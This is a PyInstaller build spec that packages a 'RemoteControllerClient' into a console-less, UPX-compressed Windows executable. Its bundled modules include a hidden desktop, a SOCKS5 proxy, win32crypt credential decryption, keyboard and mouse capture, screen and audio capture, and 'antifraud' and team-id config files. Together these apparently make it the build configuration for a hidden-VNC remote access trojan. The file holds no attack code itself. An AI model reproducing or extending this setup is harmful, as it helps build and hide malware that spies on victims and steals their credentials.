# -*- mode: python ; coding: utf-8 -*-
import os
from pathlib import Path

from PyInstaller.utils.hooks import collect_all

base_dir = Path(__file__).resolve().parent
entry_script = base_dir / "main.py"
if not entry_script.exists():
    entry_script = base_dir.parent / "client.py"

datas = []
asset_root = os.getenv("RC_BUILD_ASSET_DIR", "").strip()
candidate_roots = []
if asset_root:
    candidate_roots.append(Path(asset_root) / "remote_client")
candidate_roots.extend([base_dir, base_dir.parent])
for filename in ("rc_team_id.txt", "rc_antifraud.json", "rc_server.json"):
    for root in candidate_roots:
        candidate = root / filename
        if candidate.exists():
            datas.append((str(candidate), "remote_client"))
            break
binaries = []
hiddenimports = [
    'win32crypt',
    'cryptography',
    'pynput',
    'pynput.mouse',
    'pynput.keyboard',
    'remote_client.apps',
    'remote_client.apps.launcher',
    'remote_client.windows.hidden_desktop',
    'remote_client.proxy.socks5_server',
]
tmp_ret = collect_all('pynput')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('av')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('aiortc')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('sounddevice')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('mss')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('numpy')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]


a = Analysis(
    [str(entry_script)],
    pathex=[],
    binaries=binaries,
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['numpy.f2py.tests', 'pytest'],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='RemoteControllerClient',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
